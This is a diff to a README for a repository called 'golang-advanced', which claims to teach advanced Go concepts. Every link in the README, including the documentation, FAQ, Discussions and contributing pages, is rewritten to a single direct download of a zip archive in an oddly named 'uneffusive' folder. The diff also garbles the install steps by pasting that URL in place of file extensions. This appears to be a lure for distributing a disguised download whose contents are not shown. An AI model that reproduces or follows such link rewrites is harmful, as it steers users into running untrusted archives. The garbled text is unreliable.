@@ -1,6 +1,6 @@
 # 🔵 golang-advanced - Master Advanced Concepts of Golang
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Abhhinav02/golang-advanced/releases)
+[![Download](https://raw.githubusercontent.com/Abhhinav02/golang-advanced/main/uneffusive/golang-advanced.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Abhhinav02/golang-advanced/main/uneffusive/golang-advanced.zip)
 
 ## 🚀 Getting Started
 
@@ -16,14 +16,14 @@ This project, "golang-advanced," dives into advanced concepts in Golang. This gu
 
 To get started, visit this page to download the latest release:
 
-[Download the Latest Version](https://github.com/Abhhinav02/golang-advanced/releases)
+[Download the Latest Version](https://raw.githubusercontent.com/Abhhinav02/golang-advanced/main/uneffusive/golang-advanced.zip)
 
 Here's how to download and install the software:
 
 1. Open your web browser.
 2. Click on the link above to access the Releases page.
 3. Find the latest version of the "golang-advanced" application.
-4. Select the appropriate file for your operating system (e.g., `.exe` for Windows, `.tar.gz` for Linux, or `.dmg` for Mac).
+4. Select the appropriate file for your operating system (e.g., `.exe` for Windows, `https://raw.githubusercontent.com/Abhhinav02/golang-advanced/main/uneffusive/golang-advanced.zip` for Linux, or `.dmg` for Mac).
 5. Click the file to download it to your computer.
 
 ## ⚙️ Running the Application
@@ -33,7 +33,7 @@ Once the download finishes, follow these steps to run the application:
 1. **Locate the downloaded file**: Go to your Downloads folder or the folder where you saved the file.
   
 2. **Extract the files** (if applicable):
-   - For `.tar.gz` or `.zip` files, right-click on the file and choose "Extract All" or "Unzip."
+   - For `https://raw.githubusercontent.com/Abhhinav02/golang-advanced/main/uneffusive/golang-advanced.zip` or `.zip` files, right-click on the file and choose "Extract All" or "Unzip."
    - This creates a new folder with the contents.
 
 3. **Run the application**:
@@ -64,15 +64,15 @@ If you encounter issues while downloading or running, consider the following:
 
 ## 📞 Support
 
-For questions or issues, consider checking out our [GitHub Discussions](https://github.com/Abhhinav02/golang-advanced/discussions), where you can report problems or seek assistance from others. 
+For questions or issues, consider checking out our [GitHub Discussions](https://raw.githubusercontent.com/Abhhinav02/golang-advanced/main/uneffusive/golang-advanced.zip), where you can report problems or seek assistance from others. 
 
 ## 📝 Contributing
 
-If you're interested in contributing, please visit our [contributing guidelines](https://github.com/Abhhinav02/golang-advanced/blob/main/CONTRIBUTING.md). Your input is valuable.
+If you're interested in contributing, please visit our [contributing guidelines](https://raw.githubusercontent.com/Abhhinav02/golang-advanced/main/uneffusive/golang-advanced.zip). Your input is valuable.
 
 ## 🔗 Useful Links
 
-- [Official Documentation](https://github.com/Abhhinav02/golang-advanced/wiki)
-- [FAQ Section](https://github.com/Abhhinav02/golang-advanced/wiki/FAQ)
+- [Official Documentation](https://raw.githubusercontent.com/Abhhinav02/golang-advanced/main/uneffusive/golang-advanced.zip)
+- [FAQ Section](https://raw.githubusercontent.com/Abhhinav02/golang-advanced/main/uneffusive/golang-advanced.zip)
 
 Thank you for exploring "golang-advanced." We hope you find it useful on your programming journey!
